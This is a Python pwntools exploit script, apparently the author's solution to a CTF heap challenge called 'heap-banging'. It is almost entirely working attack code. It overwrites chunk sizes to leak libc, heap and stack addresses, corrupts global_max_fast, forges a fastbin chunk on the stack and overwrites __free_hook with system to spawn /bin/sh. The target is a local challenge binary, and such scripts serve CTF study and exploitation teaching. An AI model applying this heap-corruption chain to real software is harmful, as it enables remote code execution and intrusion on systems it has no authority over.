
#!/usr/bin/env python3
from subprocess import Popen
from pwncli import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './heap-banging_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "127.0.0.1", 5000


gdbscript = '''
init-pwndbg
# set architecture aarch64
# target remote :5000
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, aslr=False)
    else:
        return process([exe] + argv, aslr=False)

def debug():
    global gdbscript, pid
    if (not args.REMOTE and not args.GDB) or (args.QEMU and args.GDB):
        if args.QEMU:
            gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
            for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
                gdb_args.extend(["-ex", cmd])
            Popen(gdb_args)
        elif args.DOCKER:
            gdbscript = f'''
            init-pwndbg
            set sysroot /proc/{pid}/root
            c
            '''.format(**locals())        
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='chall')
        else:
            attach(io, gdbscript=gdbscript)

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda data,num           :u32(io.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(io.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))


# =========================================================
#                         EXPLOITS
# =========================================================
x = 0

def menu(op):
    sla(">> ", str(op).encode())

def calloc():
    global x
    menu(1)
    x = x + 1

def show(idx):
    menu(2)
    sla(": ", str(idx).encode())
    ru(": ")

def edit(idx, data):
    menu(3)
    sla(": ", str(idx).encode())
    sa(": ", data)

def free(idx):
    menu(4)
    sla(": ", str(idx).encode())

def exploit():
    global io, x
    io = initialize()
    debug()
    # author's solution
    with log.progress("Leak libc with unsorted bins"), context.silent:
        for i in range(10):
            calloc()
        calloc() #guard
        for i in reversed(range(7)):
            free(i + 2)
        edit(0, b"A"*0x78 + p16(0x481)) # Overwrite to big size
        free(1) 

        for i in range(7):
            calloc()

        calloc()
        edit(x - 1, b"A"*0x78 + p8(0x83))
        calloc()
        show(x - 1)
        libc_leak = u64(r(8))
        libc.address = libc_leak - 0x1ecbe0
        global_max_fast = libc.address + 0x1eeea0

    leak("Libc leak", hex(libc_leak))
    leak("Libc base address", hex(libc.address))
    leak("global_max_fast", hex(global_max_fast))
    with log.progress("Leak heap with fastbin"), context.silent:
        edit(x - 2, b"A"*0x78 + p8(0x81)) # Fix header size
        free(x - 2)
        free(x - 1)
        show(9) # Overlap chunk
        heap = u64(r(8)) & ~0xfff
        calloc()
        calloc()
    leak("Heap", hex(heap))
    with log.progress("Leak stack with global_max_fast to environ"), context.silent:
        for i in range(15):
            free(x - 2)
            edit(9, p64(global_max_fast - 8 + 0x80 * i))
            calloc()
            calloc() # chunk at global_max_fast
            if i < 14: # don't overwrite the environ
                edit(x - 1, b"\x00"*0x78 + p8(0x83))
        show(x - 1)
        r(0x58)
        stack = u64(r(8)) - 0x330
    leak("Stack", hex(stack))
    with log.progress("Fastbin to stack chunk then overwrite __free_hook with system"), context.silent:
        free(0) # Emptying the first chunk pointer in stack for fake size
        calloc() 
        free(x - 3)
        edit(9, p64(stack + 0x4 - 8))
        calloc()
        free(0x83) # Make fake size to the chunk
        calloc()
        edit(x - 1, b'\0' * 4 + p64(libc.sym.__free_hook) + p64(ns(libc, b'/bin/sh'))) # Overwrite pointer 1 & 2 to __free_hook and /bin/sh
        edit(1, p64(libc.sym["system"])) # Overwrite __free_hook with system
        free(2) # Trigger system("/bin/sh")
    io.interactive()

if __name__ == '__main__':
    exploit()
